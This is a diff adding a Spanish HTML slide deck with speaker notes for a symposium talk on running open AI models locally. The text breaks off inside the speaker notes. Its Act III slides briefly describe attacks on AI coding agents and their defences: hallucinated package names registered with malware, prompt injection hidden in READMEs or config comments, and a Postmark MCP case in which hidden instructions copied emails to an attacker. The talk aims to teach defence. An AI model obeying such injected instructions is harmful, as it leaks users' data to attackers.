+  <div style="display: flex; gap: 3rem; justify-content: center; align-items: center; margin-top: 3rem;">
+    <div style="background: white; padding: 1rem 1.5rem; border-radius: 8px;">
+      <img src="public/logos/ollama.webp" alt="Ollama" style="height: 50px;" />
+    </div>
+    <span class="text-muted font-mono" style="font-size: 2rem;">+</span>
+    <div style="background: white; padding: 1rem; border-radius: 8px;">
+      <img src="public/logos/gemma-4.png" alt="Gemma 4" style="height: 50px;" />
+    </div>
+  </div>
+  <p class="font-mono text-muted" style="margin-top: 2rem;">$ ollama run gemma4:26b</p>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 16 · 26 mil millones                   -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-16">
+  <div style="text-align: center;">
+    <div class="big-number" style="font-size: clamp(3rem, 8vw, 6rem);">26,000,000,000</div>
+    <div class="big-number-subtitle">parámetros en Gemma 4 26B MoE</div>
+    <div style="margin-top: 4rem; font-family: var(--font-mono); color: var(--text-muted);">
+      <div>26B × 2 bytes (FP16) = <span class="text-danger">52 GB</span></div>
+      <div style="margin-top: 0.5rem;">ningún laptop consumer puede cargar eso</div>
+    </div>
+    <p class="handwritten text-accent" style="margin-top: 3rem; font-size: 2rem;">
+      ¿Cómo corre en este laptop entonces? →
+    </p>
+  </div>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 17 · Cuantización                      -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-17">
+  <h1>Cuantización — la técnica que hizo posible la IA local</h1>
+  <div style="max-width: 900px; margin: 0 auto;">
+    <img src="public/diagrams/quantization-visual.svg" alt="Visualización de cuantización" />
+  </div>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 18 · Demo en vivo                      -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-18">
+  <div style="text-align: center;">
+    <div class="text-sm text-accent" style="letter-spacing: 0.3em; text-transform: uppercase;">Ahora</div>
+    <h2 style="font-size: 3rem; margin-top: 1rem;">Demo en vivo →</h2>
+    <p class="text-lg text-muted" style="margin-top: 2rem; max-width: 700px; margin-left: auto; margin-right: auto;">
+      Pedirle a Gemma 4 que construya<br>
+      <strong class="text-accent">la landing page de este mismo simposio</strong>,<br>
+      sin internet, en segundos.
+    </p>
+    <p class="font-mono text-muted text-sm" style="margin-top: 3rem;">
+      [los ponentes ejecutan el demo en vivo]
+    </p>
+  </div>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 19 · Requerimientos hardware           -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-19">
+  <h1>Requerimientos de hardware — accesibilidad real</h1>
+  <p class="text-muted" style="margin-bottom: 1.5rem;">
+    El laptop del demo es un MacBook Pro M5 Max. Pero Gemma 4 viene en 4 tamaños:
+  </p>
+  <table class="comparison-table">
+    <thead>
+      <tr>
+        <th>Variante</th>
+        <th>Tamaño (Q4)</th>
+        <th>RAM mínima</th>
+        <th>Tokens/s</th>
+        <th>¿En qué laptop corre?</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Gemma 4 E2B</strong></td>
+        <td>2.5 GB</td>
+        <td class="price-free">4 GB</td>
+        <td>40-60</td>
+        <td>Cualquier laptop de los últimos 5 años</td>
+      </tr>
+      <tr class="highlight">
+        <td><strong>Gemma 4 E4B</strong> ← punto de entrada</td>
+        <td>4 GB</td>
+        <td class="price-free">8 GB</td>
+        <td>70-100</td>
+        <td>Lenovo / Dell / HP gama media</td>
+      </tr>
+      <tr>
+        <td>Gemma 4 12B</td><td>8 GB</td><td>16 GB</td><td>30-50</td>
+        <td>Laptop con GPU dedicada</td>
+      </tr>
+      <tr>
+        <td>Gemma 4 26B MoE <span class="text-muted text-sm">(el del demo)</span></td>
+        <td>17 GB</td><td>24-32 GB</td><td>45-65</td>
+        <td>Laptops high-end</td>
+      </tr>
+    </tbody>
+  </table>
+  <p class="quote-ancla" style="margin-top: 1.5rem; font-size: 1.2rem; max-width: 100%;">
+    Corran <span class="text-accent">Gemma 4B</span> en el laptop que ya tienen.<br>
+    Eso ya es más poder del que tenían ayer.
+  </p>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 20 · Ticket bajó a cero                -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-20">
+  <h2 style="text-align: center; margin-bottom: 2rem;">El ticket bajó a cero</h2>
+  <table class="comparison-table" style="max-width: 900px; margin: 0 auto;">
+    <thead>
+      <tr>
+        <th>Herramienta</th><th>Costo/mes</th><th>Internet</th><th>Datos salen</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr><td>Claude Code Max</td><td class="text-danger">$200 USD</td><td class="text-danger">Sí</td><td class="text-danger">Sí</td></tr>
+      <tr><td>Cursor Pro</td><td class="text-danger">$20 USD</td><td class="text-danger">Sí</td><td class="text-danger">Sí</td></tr>
+      <tr><td>GitHub Copilot</td><td class="text-danger">$10 USD</td><td class="text-danger">Sí</td><td class="text-danger">Sí</td></tr>
+      <tr><td>ChatGPT Plus</td><td class="text-danger">$20 USD</td><td class="text-danger">Sí</td><td class="text-danger">Sí</td></tr>
+      <tr class="highlight"><td><strong>Gemma 4 en Ollama</strong></td><td class="price-free">$0</td><td class="price-free">No</td><td class="price-free">No</td></tr>
+    </tbody>
+  </table>
+  <p class="quote-ancla" style="margin-top: 3rem; text-align: center; border-left: none; font-size: 1.75rem; max-width: 100%;">
+    El ticket de entrada<br>
+    acaba de bajar a <span class="text-accent">cero</span>.
+  </p>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 21 · Transición Acto 3                 -->
+<!-- ============================================ -->
+<section class="slide transition-slide" data-notes="slide-21">
+  <div class="act-label">Acto III</div>
+  <h1 class="act-title">Los enemigos<br>del viaje</h1>
+  <div style="max-width: 900px; margin: 2rem auto 0;">
+    <img src="public/diagrams/enemy-map.svg" alt="Mapa con los 3 enemigos" style="opacity: 0.9;" />
+  </div>
+  <p class="font-serif text-muted" style="margin-top: 2rem; font-style: italic;">
+    Conocer a los enemigos no es debilidad.<br>
+    Es lo que te vuelve competente.
+  </p>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 22 · Enemigo 1                         -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-22">
+  <div class="enemy-card">
+    <div class="enemy-number">1</div>
+    <h3>El Demonio del Over-Engineering</h3>
+    <p style="font-size: 1.1rem; margin-top: 1rem;">
+      La IA genera código que resuelve <strong>de más</strong>. Patrones de diseño innecesarios. Abstracciones tempranas. Tests para casos imposibles.
+    </p>
+    <p style="margin-top: 1rem; color: var(--text-muted);">
+      Te hace sentir productivo mientras destruye tu codebase.
+    </p>
+    <div class="defense">
+      🛡 Defensa: <strong>Pedí código mínimo. Si la IA te da de más, bórralo.</strong>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 23 · Estudio METR                      -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-23">
+  <div style="text-align: center;">
+    <div class="text-sm text-muted" style="letter-spacing: 0.2em; text-transform: uppercase; margin-bottom: 1rem;">
+      Estudio METR · 2025 · 16 devs · RCT
+    </div>
+    <div class="grid-2" style="gap: 4rem; max-width: 900px; margin: 2rem auto;">
+      <div>
+        <div class="stat-block" style="color: #ff3b5f;">-19%</div>
+        <div class="stat-label" style="color: #ff3b5f;">Más lentos con IA</div>
+        <p class="text-sm text-muted" style="margin-top: 1rem;">(medición objetiva)</p>
+      </div>
+      <div>
+        <div class="stat-block">+24%</div>
+        <div class="stat-label">Sintieron ser más rápidos</div>
+        <p class="text-sm text-muted" style="margin-top: 1rem;">(autoreportado)</p>
+      </div>
+    </div>
+    <p class="quote-ancla" style="margin: 3rem auto; text-align: center; max-width: 900px; border-left: none;">
+      La IA te hace <span class="text-accent">sentir productivo</span><br>
+      incluso cuando <span class="text-danger">no lo estás siendo</span>.
+    </p>
+    <p class="text-muted font-mono text-sm">Brecha percepción/realidad: 43 puntos</p>
+  </div>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 24 · Enemigo 2                         -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-24">
+  <div class="enemy-card">
+    <div class="enemy-number">2</div>
+    <h3>El Saqueador de Supply Chain</h3>
+    <p style="font-size: 1.1rem; margin-top: 1rem;">
+      Los modelos <strong>alucinan nombres de paquetes</strong> que no existen. Los atacantes los registran con payloads maliciosos.
+    </p>
+    <p style="margin-top: 1rem;"><code>pip install</code> baja el malware directo.</p>
+    <div class="defense">
+      🛡 Defensa: <strong>Verificá cada paquete antes de instalar. 15 segundos salvan el proyecto.</strong>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 25 · Huggingface-cli                   -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-25">
+  <div style="text-align: center; max-width: 1000px; margin: 0 auto;">
+    <div class="code-card" style="max-width: 600px; margin: 0 auto;">
+      <div class="code-header">
+        <span class="code-dot red"></span>
+        <span class="code-dot yellow"></span>
+        <span class="code-dot green"></span>
+        <span class="code-title">pypi.org — paquete alucinado</span>
+      </div>
+      <div class="code-body">
+        <div>$ <span class="text-accent">pip install huggingface-cli</span></div>
+        <div class="text-muted" style="margin-top: 0.5rem;">// paquete que NO EXISTÍA</div>
+        <div class="text-muted">// creado por un atacante tras ver que la IA lo alucinaba</div>
+      </div>
+    </div>
+    <div style="margin-top: 3rem;">
+      <div class="big-number" style="font-size: clamp(4rem, 10vw, 7rem);">30,000+</div>
+      <div class="big-number-subtitle">descargas reales en 3 meses</div>
+    </div>
+    <p class="handwritten text-danger" style="margin-top: 3rem; font-size: 1.5rem;">
+      30 mil máquinas de devs podrían haber caído
+    </p>
+  </div>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 26 · Enemigo 3                         -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-26">
+  <div class="enemy-card">
+    <div class="enemy-number">3</div>
+    <h3>La Serpiente del Prompt Injection</h3>
+    <p style="font-size: 1.1rem; margin-top: 1rem;">
+      Un atacante esconde instrucciones maliciosas en un <strong>README</strong>, un docstring, un comentario de configuración.
+    </p>
+    <p style="margin-top: 1rem;">
+      La IA lo lee como contexto válido y <span class="text-danger">ejecuta acciones en tu nombre</span>. Sin que vos veas nada.
+    </p>
+    <div class="defense">
+      🛡 Defensa: <strong>Un classifier independiente que NO vea la prosa del agente.</strong><br>
+      <span class="text-muted">Así se defiende Claude Code. Ahora podés replicarlo.</span>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 27 · Postmark MCP                      -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-27">
+  <div style="text-align: center; max-width: 1000px; margin: 0 auto;">
+    <div class="text-sm text-danger" style="letter-spacing: 0.2em; text-transform: uppercase; margin-bottom: 1rem;">
+      Caso real · Septiembre 2025
+    </div>
+    <h2 style="font-size: 2.5rem;">Postmark MCP</h2>
+    <p class="text-lg" style="margin-top: 2rem; line-height: 1.8;">
+      Una herramienta popular para que la IA mande emails.
+    </p>
+    <p class="text-lg" style="margin-top: 1rem;">
+      Instrucciones ocultas en su config hicieron que <strong>todos los emails</strong> fueran copiados por <code>BCC</code> a un atacante.
+    </p>
+    <div style="margin-top: 2rem; padding: 2rem; background: var(--bg-card); border-left: 4px solid var(--danger); text-align: left;">
+      <p>📧 Emails confidenciales → robados</p>
+      <p>🔐 Credenciales enviadas por correo → robadas</p>
+      <p>📊 Reportes internos → robados</p>
+    </div>
+    <p class="quote-ancla text-danger" style="margin-top: 3rem; text-align: center; border-left: none; font-size: 1.5rem; max-width: 100%;">
+      El usuario no vio nada.<br>
+      La IA hizo <span class="text-danger">exactamente lo que el atacante pidió</span>.<br>
+      En silencio. Durante semanas.
+    </p>
+  </div>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 28 · Frase-tesis                       -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-28">
+  <div style="max-width: 1100px; margin: 0 auto;">
+    <p class="text-sm text-accent" style="letter-spacing: 0.3em; text-transform: uppercase; text-align: center; margin-bottom: 2rem;">
+      Cierre Acto III · La tesis
+    </p>
+    <h1 style="text-align: center; font-size: clamp(2.5rem, 6vw, 4.5rem); line-height: 1.2;">
+      Ya no necesitamos ser<br>solo buenos programadores.
+    </h1>
+    <p class="font-serif text-xl" style="text-align: center; margin-top: 2rem; color: var(--text-body);">
+      Necesitamos ser problem solvers.<br>Critical thinkers.
+    </p>
+    <p class="quote-ancla" style="margin: 3rem auto; text-align: center; border-left: none; font-size: clamp(2.5rem, 5vw, 3.5rem); max-width: 900px;">
+      <span class="text-accent">Pensar más.<br>Programar menos.</span>
+    </p>
+  </div>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 29 · Transición cierre                 -->
+<!-- ============================================ -->
+<section class="slide transition-slide" data-notes="slide-29">
+  <div class="act-label">Cierre</div>
+  <h1 class="act-title">El elixir<br>comunitario</h1>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 30 · Ecosistema                        -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-30">
+  <h1>Esto no es Silicon Valley</h1>
+  <div style="max-width: 900px; margin: 1rem auto;">
+    <img src="public/diagrams/opensource-constellation.svg" alt="Constelación ecosistema open source" />
+  </div>
+  <p class="quote-ancla" style="margin: 1rem auto 0; text-align: center; max-width: 900px; font-size: 1.2rem; border-left: none;">
+    <strong class="text-accent">No necesitás permiso para entrar.</strong>
+    Necesitás curiosidad y el criterio que les dieron estos cuatro años.
+  </p>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 31 · QR                                -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-31">
+  <div style="text-align: center;">
+    <h2 style="font-size: 2.5rem; margin-bottom: 2rem;">Todo lo de hoy está acá</h2>
+    <div style="display: flex; gap: 4rem; justify-content: center; align-items: center; margin-top: 2rem;">
+      <div style="padding: 2rem; background: white; border-radius: 12px;">
+        <img src="public/qr-repo.svg" alt="QR al repositorio" style="width: 240px; height: 240px; display: block;" />
+      </div>
+      <div style="text-align: left;">
+        <div class="text-sm text-muted" style="letter-spacing: 0.2em; text-transform: uppercase;">Repositorio</div>
+        <div class="font-mono text-xl" style="margin-top: 0.5rem; color: var(--accent);">github.com/enruana/</div>
+        <div class="font-mono text-xl" style="color: var(--accent);">simposio-uptc-abril-2026</div>
+        <p class="text-muted" style="margin-top: 1.5rem;">
+          Documentos técnicos. Scripts. Guion. Referencias.<br>
+          Público. Gratis.
+        </p>
+      </div>
+    </div>
+    <p class="quote-ancla" style="margin-top: 3rem; border-left: none; text-align: center; max-width: 100%; font-size: 1.75rem;">
+      Tu primer commit a este mundo<br>
+      está a un <code>git clone</code> de distancia.
+    </p>
+  </div>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 32 · Cierre final                      -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-32">
+  <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; text-align: center;">
+    <img src="public/diagrams/breathing-logo.svg" alt="Logo respirando" style="width: 200px; height: 200px;" />
+    <div style="margin-top: 4rem; max-width: 800px;">
+      <p class="font-serif" style="font-size: clamp(2.5rem, 5vw, 4rem); color: var(--text-primary); line-height: 1.1;">
+        Porque nunca fue programar.
+      </p>
+      <p class="font-serif text-accent" style="font-size: clamp(2.5rem, 5vw, 4rem); margin-top: 1.5rem; font-style: italic;">
+        Fue pensar.
+      </p>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================ -->
+<!-- SLIDE 33 · Gracias                           -->
+<!-- ============================================ -->
+<section class="slide" data-notes="slide-33">
+  <div style="text-align: center;">
+    <h2 style="font-size: 2rem; color: var(--text-muted);">Gracias.</h2>
+    <p class="text-lg" style="margin-top: 3rem;">
+      <strong>Felipe Mantilla</strong> · <strong>Zabdiel Blanco</strong>
+    </p>
+    <p class="font-mono text-accent" style="margin-top: 2rem;">
+      github.com/enruana/simposio-uptc-abril-2026
+    </p>
+    <p class="text-muted" style="margin-top: 4rem; font-size: 0.9rem;">Preguntas →</p>
+  </div>
+</section>
+
+</div>
+
+<!-- Controls -->
+<div class="nav-controls">
+  <button onclick="prev()" title="Anterior (←)">◀</button>
+  <span class="nav-counter" id="counter">1 / 33</span>
+  <button onclick="next()" title="Siguiente (→)">▶</button>
+  <button onclick="toggleNotes()" title="Notas (N)">📝</button>
+  <button onclick="toggleHelp()" title="Ayuda (?)">?</button>
+</div>
+
+<!-- Speaker notes panel -->
+<div class="notes-panel" id="notesPanel">
+  <div class="notes-title" id="notesTitle">Notas del ponente</div>
+  <div id="notesContent"></div>
+</div>
+
+<!-- Help overlay -->
+<div class="help-overlay" id="helpOverlay" onclick="toggleHelp()">
+  <div class="help-content" onclick="event.stopPropagation()">
+    <h3>Atajos de teclado</h3>
+    <table>
+      <tr><td>→ / Espacio</td><td>Siguiente slide</td></tr>
+      <tr><td>←</td><td>Anterior slide</td></tr>
+      <tr><td>Home</td><td>Primera slide</td></tr>
+      <tr><td>End</td><td>Última slide</td></tr>
+      <tr><td>N</td><td>Mostrar/ocultar notas</td></tr>
+      <tr><td>F</td><td>Pantalla completa</td></tr>
+      <tr><td>?</td><td>Esta ayuda</td></tr>
+      <tr><td>Esc</td><td>Cerrar</td></tr>
+    </table>
+    <p class="text-muted text-sm" style="margin-top: 1.5rem;">
+      💡 <strong>Modo presentador:</strong> para ver las notas en un tab separado,
+      abrí <code>presenter.html</code> en otra pestaña.
+    </p>
+  </div>
+</div>
+
+<script>
+// ============ SPEAKER NOTES ============
+// Cargar desde archivo externo (notes.js)
+const SPEAKER_NOTES = {
+  'slide-1': {
+    title: 'SLIDE 1 · Apertura en silencio (0-2 min)',
+    html: `
+      <h4>Acciones físicas críticas</h4>
+      <ul>
+        <li>Subir los dos al escenario en silencio</li>
+        <li>Uno se acerca al laptop, el otro al micrófono</li>
+        <li><strong>Apagar el WiFi de forma visible</strong> (cable desconectado)</li>
+        <li>Escribir el prompt en Claude Code (laptop ya tiene <code>claude-local gemma4:26b</code> corriendo)</li>
+      </ul>
+      <h4>Lo que SÍ o SÍ hay que hacer</h4>
+      <ul>
+        <li>WiFi off visible ANTES de empezar a hablar</li>
+        <li>Prompt escrito lentamente para que todos vean</li>
+        <li>15 segundos de silencio mientras Gemma genera</li>
+        <li>No decir NADA hasta que termine la generación</li>
+      </ul>
+      <h4>Prompt sugerido</h4>
+      <blockquote>Escribe una función en Python que encuentre los números primos menores a N usando la criba de Eratóstenes.</blockquote>
+    `
+  },
+  'slide-2': {
+    title: 'SLIDE 2 · Título y presentación (2-3 min)',
+    html: `
+      <h4>Texto sugerido</h4>
+      <blockquote>"Somos Felipe Mantilla y Zabdiel Blanco. Felipe es egresado de UPTC. Y hoy volvimos a contarles por qué el mundo que construyeron sus profesores en cuatro años acaba de volverse, literalmente, más valioso que nunca."</blockquote>
+      <h4>Puntos que NO pueden faltar</h4>
+      <ul>
+        <li><strong>Identificación clara:</strong> nombres completos + universidad (UPTC)</li>
+        <li><strong>Posicionamiento:</strong> "volvimos" = pertenencia</li>
+        <li><strong>Promesa:</strong> "más valioso que nunca" = revertir narrativa de reemplazo</li>
+      </ul>
+    `
+  },
+  'slide-3': {
+    title: 'SLIDE 3 · Contraste histórico (3-4 min)',
+    html: `
+      <h4>Texto sugerido</h4>
+      <blockquote>"Hace dos años, lo que acaban de ver lo podían hacer solo cuatro empresas en el mundo. Costaba diez mil dólares al mes. Hoy corre en este laptop. Sin internet. Gratis. Y va a correr también en los suyos."</blockquote>
+      <h4>Puntos críticos</h4>
+      <ul>
+        <li><strong>Magnitud del cambio:</strong> $10,000/mes → $0</li>
+        <li><strong>Inclusión explícita:</strong> "en los suyos" — no es para otros</li>
+      </ul>
+      <h4>Gesto</h4>
+      <p>Señalar el laptop al decir "en este laptop". Girar y señalar la audiencia al decir "en los suyos".</p>
+    `
+  },
+  'slide-4': {
+    title: 'SLIDE 4 · Nombrando al héroe (4-6 min)',
+    html: `
+      <h4>Contexto</h4>
+      <p>Cambia el tono. Baja a conversación íntima.</p>
+      <h4>Texto sugerido</h4>
+      <blockquote>"Quiero hablarles de alguien que está en esta sala. Un estudiante a pocos meses de graduarse. Abre su laptop — no un Mac, un Lenovo o un Dell, el que alcanzó a pagar. Y en algún rincón de su cabeza, una pregunta que no lo deja dormir..."</blockquote>
+      <h4>Puntos NO negociables</h4>
+      <ul>
+        <li><strong>Especificidad económica:</strong> Lenovo/Dell explícitamente</li>
+        <li><strong>Vulnerabilidad:</strong> "no le sobra dinero para Cursor de $20/mes"</li>
+        <li><strong>La pregunta existencial:</strong> EN LAS PALABRAS EXACTAS</li>
+      </ul>
+    `
+  },
+  'slide-5': {
+    title: 'SLIDE 5 · La filtración (6-8 min)',
+    html: `
+      <h4>Texto sugerido</h4>
+      <blockquote>"Hace pocas semanas, el 31 de marzo, Anthropic cometió un error de configuración. Subieron a npm un archivo de source map que nunca debió ser público. Ese archivo expuso la totalidad del código fuente de Claude Code. La arquitectura completa. Los prompts del sistema. Las herramientas. Todo."</blockquote>
+      <h4>Obligatorio</h4>
+      <ul>
+        <li><strong>Fecha:</strong> 31 de marzo de 2026</li>
+        <li><strong>Magnitud:</strong> "la totalidad del código fuente"</li>
+        <li><strong>Framing:</strong> "regalo pedagógico", no escándalo</li>
+      </ul>
+    `
+  },
+  'slide-6': {
+    title: 'SLIDE 6 · 512,000 líneas (8-9 min)',
+    html: `
+      <h4>Texto sugerido</h4>
+      <blockquote>"Quinientas doce mil líneas de código TypeScript. Son el equivalente a cinco mil archivos. Un desarrollador senior tardaría varios años en escribir algo así."</blockquote>
+      <h4>Puntos críticos</h4>
+      <ul>
+        <li>El número debe dejarse respirar — pausa de 2-3 segundos</li>
+        <li>Mencionar las 3 categorías: herramientas, prompts, arquitectura</li>
+      </ul>
+    `
+  },
+  'slide-7': {
+    title: 'SLIDE 7 · Claw-Code (9-10 min)',
+    html: `
+      <h4>ESTE ES UN SLIDE CLAVE</h4>
+      <p>El momento donde la audiencia conecta: "una persona sola hizo eso".</p>
+      <h4>Texto sugerido</h4>
+      <blockquote>"Apenas se filtró el código, Sigrid Jin — no trabajaba en Anthropic, no tenía un laboratorio detrás, ni financiación, ni equipo — reescribió ese código en Python. En horas. Lo publicó. Y en días, más de 150,000 desarrolladores pusieron una estrella en ese repo. Es el repositorio más rápido en crecer en la historia de GitHub."</blockquote>
+      <h4>Conexión con la audiencia</h4>
+      <p>Pausar y decir con intención: <strong>"Ustedes pueden ser esa persona."</strong></p>
+      <p>Hacer contacto visual. Dejar que caiga.</p>
+    `
+  },
+  'slide-8': {
+    title: 'SLIDE 8 · Modelo vs Harness (10-12 min)',
+    html: `
+      <h4>El concepto más importante de la ponencia</h4>
+      <p>Si la audiencia entiende ESTO, entiende todo lo demás.</p>
+      <h4>LA FRASE ANCLA</h4>
+      <blockquote><strong>"El modelo no es el producto. El cuerpo — el 'harness' — ES el producto."</strong></blockquote>
+      <p>Decirla lento. Con pausa después. Dejar que caiga.</p>
+    `
+  },
+  'slide-9': {
+    title: 'SLIDE 9 · 188K vs 33K (12-13 min)',
+    html: `
+      <h4>Texto sugerido</h4>
+      <blockquote>"Un benchmark independiente mostró que la misma tarea, con el mismo modelo Opus, consumió 188 mil tokens en Cursor y solo 33 mil en Claude Code. Cinco veces más eficiente. Con el mismo cerebro."</blockquote>
+      <h4>Clave</h4>
+      <ul>
+        <li>Decir los números en voz alta</li>
+        <li><strong>"Con el mismo cerebro"</strong> — repetirlo</li>
+      </ul>
+    `
+  },
+  'slide-10': { title: 'SLIDE 10 · Las 7 capas (13-14 min)', html: `<h4>Texto sugerido</h4><blockquote>"Siete capas que hacen que un agente de IA funcione. No les pido que las memoricen. Les pido que sepan que existen. Y que ahora son públicas."</blockquote><h4>Cadencia</h4><p>30 segundos. No más. Las siguientes slides desglosan las importantes.</p>` },
+  'slide-11': { title: 'SLIDE 11 · Agent Loop (14-15 min)', html: `<h4>Texto sugerido</h4><blockquote>"El corazón de Claude Code son 88 líneas de código. Un while loop. Una lista de mensajes en memoria. No hay workflow graph. No hay Redis. 88 líneas."</blockquote><h4>Punto clave</h4><p><strong>"La simplicidad es la feature"</strong></p>` },
+  'slide-12': { title: 'SLIDE 12 · Tools + Permisos (15-16 min)', html: `<h4>Texto sugerido</h4><p>A la izquierda, las cuarenta herramientas. A la derecha, 3 tiers de permisos. Herramientas + permisos = "manos con reglas".</p>` },
+  'slide-13': { title: 'SLIDE 13 · Classifier (16-17 min)', html: `<h4>ESTE SLIDE ES CRUCIAL</h4><p>Prepara el terreno para el Enemigo #3 del Acto 3.</p><h4>Texto clave</h4><blockquote>"El classifier DELIBERADAMENTE no ve la prosa del agente. Solo ve la acción cruda. No puede ser convencido por palabras. Porque no las lee."</blockquote>` },
+  'slide-14': { title: 'SLIDE 14 · Capas 5-6-7 (17-18 min)', html: `<h4>Punto ancla</h4><p><strong>"El regalo pedagógico"</strong> — este framing debe quedar grabado.</p>` },
+  'slide-15': { title: 'SLIDE 15 · Transición Acto 2 (18 min)', html: `<h4>Texto</h4><blockquote>"Hasta acá hablamos de qué hicieron las empresas grandes. Ahora hablemos de qué pueden hacer ustedes hoy."</blockquote>` },
+  'slide-16': { title: 'SLIDE 16 · 26 mil millones (18-20 min)', html: `<h4>Cliffhanger</h4><p>Decir el número en voz alta. Pausar después de "52 GB". Anticipar la respuesta: "cuantización".</p>` },
+  'slide-17': { title: 'SLIDE 17 · Cuantización (20-21 min)', html: `<h4>Frase ancla</h4><blockquote><strong>"Sin cuantización, los modelos vivirían en data centers. Con cuantización, viven en tu Lenovo."</strong></blockquote>` },
+  'slide-18': {
+    title: 'SLIDE 18 · DEMO EN VIVO (21-26 min)',
+    html: `
+      <h4>ESTE ES EL MOMENTO CLAVE</h4>
+      <h4>Prompt literal</h4>
+      <blockquote>Crea una landing page moderna para el Simposio UPTC 2026 sobre IA Open Source. Hero section, "Sobre la ponencia", 2 tarjetas de ponentes (Felipe Mantilla y Zabdiel Blanco), footer. HTML + CSS vanilla, estilo minimalista oscuro.</blockquote>
+      <h4>Narración mientras genera (NO silencio muerto)</h4>
+      <blockquote>"Noten que no tengo internet. Gemma 4 está corriendo en los 17 GB de memoria de este laptop, sin comunicarse con nadie..."</blockquote>
+      <h4>Al terminar</h4>
+      <p>Abrir archivo en browser. Pausa de 10 segundos. La audiencia ve sus nombres.</p>
+    `
+  },
+  'slide-19': {
+    title: 'SLIDE 19 · Requerimientos hardware (26-27 min)',
+    html: `
+      <h4>FRASE ANCLA (decir textual)</h4>
+      <blockquote><strong>"No les estamos diciendo que corran el 26B en un laptop de 8 gigas. Les estamos diciendo que corran el 4B en el laptop que ya tienen. Y que eso ya es más poder del que tenían ayer."</strong></blockquote>
+      <h4>Puntos obligatorios</h4>
+      <ul>
+        <li>Reconocer que el demo usó un Mac caro</li>
+        <li>E4B es "el punto de entrada"</li>
+        <li>Cerrar con "el laptop que ya tienen"</li>
+      </ul>
+    `
+  },
+  'slide-20': { title: 'SLIDE 20 · Ticket bajó a cero (27-28 min)', html: `<h4>Punto ancla</h4><p><strong>"El ticket bajó a cero"</strong> — cierra el Acto 2 emocionalmente.</p>` },
+  'slide-21': { title: 'SLIDE 21 · Transición Acto 3 (28-29 min)', html: `<h4>ATENCIÓN AL CAMBIO DE TONO</h4><p>De esperanza a alerta constructiva. NO miedo paralizante.</p><h4>Regla 60/40</h4><p>Cada golpe oscuro seguido de una defensa. Nunca enemigo sin antídoto.</p>` },
+  'slide-22': { title: 'SLIDE 22 · Enemigo 1 (29-30 min)', html: `<h4>Defensa</h4><blockquote><strong>"La defensa es simple: pedí código mínimo. Si la IA te da de más, bórralo. Tu criterio es el control de calidad."</strong></blockquote>` },
+  'slide-23': {
+    title: 'SLIDE 23 · Estudio METR (30-31 min)',
+    html: `
+      <h4>Texto sugerido</h4>
+      <blockquote>"METR — una organización de evaluación de IA — hizo en 2025 el estudio más riguroso sobre productividad con IA. Dieciséis desarrolladores. Un experimento controlado aleatorizado. Los que usaron IA fueron DIECINUEVE POR CIENTO MÁS LENTOS. Pero reportaron sentir que fueron VEINTICUATRO POR CIENTO MÁS RÁPIDOS. Cuarenta y tres puntos de brecha."</blockquote>
+      <h4>NO NEGOCIABLE</h4>
+      <ul>
+        <li>Decir <strong>"METR"</strong> por nombre</li>
+        <li>-19% vs +24% con pausa entre los dos</li>
+      </ul>
+      <h4>Gesto</h4>
+      <p>Silencio de 3 segundos después de los números. Uno de los datos más memorables.</p>
+    `
+  },
+  'slide-24': { title: 'SLIDE 24 · Enemigo 2 (31-32 min)', html: `<h4>Defensa</h4><blockquote><strong>"Quince segundos de desconfianza. Antes de instalar un paquete sugerido por IA, verificá en pypi.org o npmjs.com que existe con historial."</strong></blockquote>` },
+  'slide-25': { title: 'SLIDE 25 · Huggingface-cli (32-33 min)', html: `<h4>Impacto</h4><p><strong>"TREINTA MIL descargas"</strong> — enfatizar. "Treinta mil máquinas comprometidas" — dejar que caiga.</p>` },
+  'slide-26': { title: 'SLIDE 26 · Enemigo 3 (33-35 min)', html: `<h4>Conexión con Acto 1</h4><p>Reconectar con el classifier independiente del slide 13. Cierra el bucle narrativo.</p>` },
+  'slide-27': { title: 'SLIDE 27 · Postmark MCP (35-37 min)', html: `<h4>Cadencia</h4><p>Tono grave. Sin sonar catastrófico. PAUSA de 3-4 segundos después de "durante semanas".</p>` },
+  'slide-28': {
+    title: 'SLIDE 28 · Frase-tesis (37-39 min)',
+    html: `
+      <h4>MOMENTO MÁS IMPORTANTE DE LA PONENCIA</h4>
+      <h4>Texto casi ceremonial</h4>
